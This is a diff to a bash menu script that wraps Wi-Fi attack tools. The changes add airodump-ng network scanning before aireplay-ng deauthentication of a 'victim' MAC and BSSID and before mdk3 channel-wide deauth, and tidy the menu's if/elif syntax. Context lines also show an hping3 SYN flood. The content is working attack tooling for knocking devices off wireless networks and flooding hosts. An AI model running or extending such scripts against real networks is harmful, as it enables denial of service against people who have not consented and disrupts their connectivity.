@@ -1,4 +1,4 @@
-#/usr/bin/env bash
+#!/usr/bin/env bash
 
 #color codes
 B='\e[1m'
@@ -131,6 +131,7 @@ read -p ":" r
 
 if [ $r == s ]
 then
+sudo xterm -T "all local wifi nwtworks | press (Ctrl-C) to stop me" -e "airodump-ng wlan0mon" &
 echo -e "${B}${b}[+]${g}victims MAC address${s}"
 read -p ":" mac
 echo -e "${B}${b}[+]${g}BSSID address${s}"
@@ -140,6 +141,7 @@ read -p ":" num
 sudo aireplay-ng --deauth $num -a $bssid -D -c $mac wlan0mon
 
 else
+sudo xterm -T "all local wifi nwtworks | press (Ctrl-C) to stop me" -e "airodump-ng wlan0mon" &
 echo -e "${B}${b}[+]${g}BSSID address${s}"
 read -p ":" bssid
 echo -e "${B}${b}[+]${g}number of deauth req${s}"
@@ -152,7 +154,8 @@ fi
 
 #deauth wifi channel
 mdk () {
-echo -e "${B}${b}[+]${g}channel number${s}"
+sudo xterm -T "all local wifi nwtworks | press (Ctrl-C) to stop me" -e "airodump-ng wlan0mon" &
+echo -e "${B}${b}[+]${g}enter channel number${s}"
 read -p ":" channel
 echo -e "${B}${B}${y}[!]${r}press ( Ctrl + C ) to stop${s}"
 sudo mdk3 wlan0mon d -c $channel
@@ -199,47 +202,45 @@ sudo hping3 -i u1 -S $ip
 
 
 
-if [ $c == 1 ]
+if [ $c == 1 ];
 then
-on;
-clear;
-akrech
+on
 
 
-elif [ $c == 2 ]
+elif [ $c == 2 ];
 then
 off
 
 
-elif [ $c == 3 ]
+elif [ $c == 3 ];
 then
 aireplay
 
-elif [ $c == 4 ]
+elif [ $c == 4 ];
 then
 airodump
 
-elif [ $c == 5 ]
+elif [ $c == 5 ];
 then
 kick
 
-elif [ $c == 6 ]
+elif [ $c == 6 ];
 then
 mdk
 
-elif [ $c == 7 ]
+elif [ $c == 7 ];
 then
 mdk1
 
-elif [ $c == 8 ]
+elif [ $c == 8 ];
 then
 handshake
 
-elif [ $c == 9 ]
+elif [ $c == 9 ];
 then
 router
 
-elif [ $c == 0 ]
+elif [ $c == 0 ];
 then
 bye
 
